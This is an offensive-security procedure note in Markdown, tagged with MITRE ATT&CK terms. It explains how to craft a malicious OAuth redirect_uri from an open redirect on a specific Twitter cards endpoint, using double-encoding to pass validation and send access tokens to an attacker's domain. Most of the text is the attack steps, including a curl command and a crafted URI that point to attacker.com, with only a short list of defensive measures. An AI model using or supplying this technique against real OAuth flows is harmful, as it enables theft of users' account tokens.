---
tags:
  - open-redirect
  - uri-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/exploit-twitter-open-redirect]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 6b3ea860-bab9-4186-989d-3be65b2d6490
created_at: '2025-12-14T17:24:35.776Z'
updated_at: '2025-12-14T17:24:35.776Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-Redirect-URI-Using-Open-Redirect

## Summary

This procedure crafts a redirect_uri exploiting Twitter's open redirect in the cards endpoint, combined with double-encoding to preserve a fragment for token leakage while matching OAuth validation patterns.

## Description

Twitter's cards endpoint at https://cards.twitter.com/cards/18ce53y6aap/yyms allows unchecked redirects to external sites. By appending %2523 (double-encoded #) and using it as redirect_uri, it validates under *.twitter.com/* but decodes to append tokens in the hash on the final redirect. Targets web OAuth flows.

## Requirements

1. Knowledge of Twitter's open redirect endpoint
2. Control over an external domain for final redirect
3. URL encoding tools (built-in browser dev tools suffice)

## Defense

Defensive measures and detection strategies:

- Validate redirect targets against allowlists in open redirect endpoints
- Log and alert on redirects from internal paths to external domains
- Implement CSP to block unexpected redirects

## Objectives

1. Create a valid-looking redirect_uri for OAuth
2. Ensure post-decode behavior leaks tokens via hash
3. Chain with OAuth flow for token exfiltration

## Instructions

### Step 1: Identify Open Redirect Endpoint

**Context**: Locate and test the vulnerable Twitter Cards redirect.

**Command** ([[commands/exploit-twitter-open-redirect]]):
```bash
curl -L "https://cards.twitter.com/cards/18ce53y6aap/yyms?url=http://attacker.com"
```

> This follows the redirect; expected output is HTTP 302 to http://attacker.com.

### Step 2: Apply Double-Encoding for Fragment

**Context**: Encode # as %2523 to survive OAuth decoding and appear as twitter.com path.

Construct: https://cards.twitter.com/cards/18ce53y6aap/yyms%2523?url=http://attacker.com

> Expected output: URI that redirects with preserved # for token append.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/exploit-twitter-open-redirect]]

## Tools Used

- None

## Tags

- [[open-redirect]]
- [[uri-crafting]]
